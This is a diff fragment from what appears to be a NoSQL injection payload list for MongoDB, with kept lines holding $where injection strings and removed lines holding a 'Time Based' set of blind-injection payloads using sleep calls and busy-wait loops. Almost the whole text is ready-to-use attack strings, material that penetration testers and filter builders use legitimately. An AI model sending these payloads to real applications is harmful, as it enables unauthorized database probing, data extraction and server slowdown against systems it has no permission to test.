@@ -420,15 +420,3 @@ true, $where: '1 == 1'
 {$where: "this.username.trim()"}
 {$where: "this.username.toUpperCase()"}
 {$where: "this.username.toLowerCase()"}
-
-
-
-
-#Time Based
-';sleep(5000);
-';sleep(5000)//
-';sleep(5000)||'
-';it=new Date();do{pt=new Date();}while(pt-it<5000);
-{$where: "sleep(5000) || true"}
-';for(var i=0;i<1e8;i++){}//
-';var d=new Date();while((new Date())-d<5000){}
